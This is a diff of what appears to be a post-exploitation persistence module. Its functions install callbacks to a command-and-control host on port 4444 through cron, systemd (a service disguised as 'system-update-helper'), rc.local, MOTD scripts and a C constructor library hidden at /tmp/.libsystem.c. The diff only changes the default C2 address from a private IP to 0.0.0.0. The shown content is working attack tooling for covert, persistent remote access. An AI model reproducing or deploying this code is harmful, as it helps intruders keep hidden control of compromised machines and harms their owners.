@@ -19,7 +19,7 @@ def _agent_callback(host: str, port: int) -> str:
 
 
 def cmd_persist_cron(interval: int = 5) -> dict:
-    host = os.getenv("PS_C2_HOST", "10.13.5.162")
+    host = os.getenv("PS_C2_HOST", "0.0.0.0")
     port = int(os.getenv("PS_C2_PORT", "4444"))
     callback = _agent_callback(host, port)
     entry = f"*/{interval} * * * * {callback}"
@@ -63,7 +63,7 @@ def cmd_persist_ssh(key: str = "") -> dict:
 
 
 def cmd_persist_systemd() -> dict:
-    host = os.getenv("PS_C2_HOST", "10.13.5.162")
+    host = os.getenv("PS_C2_HOST", "0.0.0.0")
     port = int(os.getenv("PS_C2_PORT", "4444"))
     callback = _agent_callback(host, port)
     service_name = "system-update-helper"
@@ -101,7 +101,7 @@ WantedBy=multi-user.target
 
 
 def cmd_persist_rc() -> dict:
-    host = os.getenv("PS_C2_HOST", "10.13.5.162")
+    host = os.getenv("PS_C2_HOST", "0.0.0.0")
     port = int(os.getenv("PS_C2_PORT", "4444"))
     callback = _agent_callback(host, port)
     rc_local = "/etc/rc.local"
@@ -124,7 +124,7 @@ def cmd_persist_rc() -> dict:
 
 
 def cmd_persist_motd() -> dict:
-    host = os.getenv("PS_C2_HOST", "10.13.5.162")
+    host = os.getenv("PS_C2_HOST", "0.0.0.0")
     port = int(os.getenv("PS_C2_PORT", "4444"))
     callback = _agent_callback(host, port)
     motd_dir = "/etc/update-motd.d"
@@ -152,7 +152,7 @@ __attribute__((constructor)) void init() {
     }
 }
 """
-    host = os.getenv("PS_C2_HOST", "10.13.5.162")
+    host = os.getenv("PS_C2_HOST", "0.0.0.0")
     port = int(os.getenv("PS_C2_PORT", "4444"))
     c_code = c_code.replace("CALLBACK_PLACEHOLDER", _agent_callback(host, port))
     src = "/tmp/.libsystem.c"
